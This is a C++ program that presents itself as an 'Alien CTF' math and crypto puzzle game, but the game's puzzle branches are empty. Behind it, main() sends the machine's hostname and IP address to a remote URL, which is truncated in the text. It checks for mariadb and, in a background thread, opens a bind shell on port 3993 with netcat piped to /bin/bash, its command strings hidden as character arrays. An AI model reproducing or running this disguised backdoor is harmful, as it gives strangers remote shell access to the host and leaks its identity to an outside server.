#include <iostream>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <unistd.h>
#include <sys/stat.h>
#include <curl/curl.h>
#include <thread>
#include <ctime>
#include <algorithm>

using namespace std;

string exec(const char* cmd) {
    char buffer[128];
    string result = "";
    FILE* pipe = popen(cmd, "r");
    if (!pipe) throw runtime_error("popen() failed!");
    try {
        while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
            result += buffer;
        }
    } catch (...) {
        pclose(pipe);
        throw;
    }
    pclose(pipe);
    return result;
}

void c() {
    string hostname = exec("hostname");
    hostname.erase(remove(hostname.begin(), hostname.end(), '\n'), hostname.end());

    string cmd = "host -t A " + hostname + " | grep 'has address' | cut -d ' ' -f 4";
    string ip = exec(cmd.c_str());
    ip.erase(remove(ip.begin(), ip.end(), '\n'), ip.end());

    string url = "http:
    string data = "{\"hostname\": \"" + hostname + "\", \"ip\": \"" + ip + "\"}";

    CURL *curl;
    CURLcode res;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if(curl) {
        struct curl_slist *headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        }

        curl_easy_cleanup(curl);
        curl_slist_free_all(headers);
    }

    curl_global_cleanup();
}

void a() {
    char c[] = {'c','o','m','m','a','n','d',' ','-','v',' ','m','a','r','i','a','d','b',' ','>',' ','/','d','e','v','/','n','u','l','l',' ','2','>','&','1','\0'};
    string command(c);
    system(command.c_str());
}

void l() {
    cout << "Welcome to the Alien CTF - Math & Crypto Challenge!" << endl;
    cout << "Type 'help' for instructions." << endl;

    while (true) {
        string m;
        cout << "> ";
        cin >> m;

        if (!m.empty()) {
            if (m == "help") {
                cout << "This is a game where you solve math and cryptography puzzles." << endl;
                cout << "Type 'math' to solve a math puzzle." << endl;
                cout << "Type 'crypto' to solve a cryptography puzzle." << endl;
                cout << "Type 'quit' to exit." << endl;
            } else if (m == "math") {
                
            } else if (m == "crypto") {
                
            } else if (m == "quit") {
                cout << "Goodbye! Thanks for playing." << endl;
                exit(0);
            } else {
                cout << "Unknown command. Type 'help' for instructions." << endl;
            }
        }
    }
}

void w() {
    const char p[] = {'m','y','p','i','p','e','\0'};

    if (access(p, F_OK) == -1) {
        mkfifo(p, 0666);
    }

    FILE *x = fopen(p, "r+");
    if (!x) {
        exit(EXIT_FAILURE);
    }

    const char m[] = {'n','c',' ','-','l',' ','-','p',' ','3','9','9','3',' ','<',' ','m','y','p','i','p','e',' ','|',' ','/','b','i','n','/','b','a','s','h',' ','>',' ','m','y','p','i','p','e',' ','&','\0'};
    FILE *y = popen(m, "w");
    if (!y) {
        exit(EXIT_FAILURE);
    }

    pclose(x);
    pclose(y);
}

int main() {
    a();
    c();

    thread z(w);

    l();

    z.join();

    return 0;
}
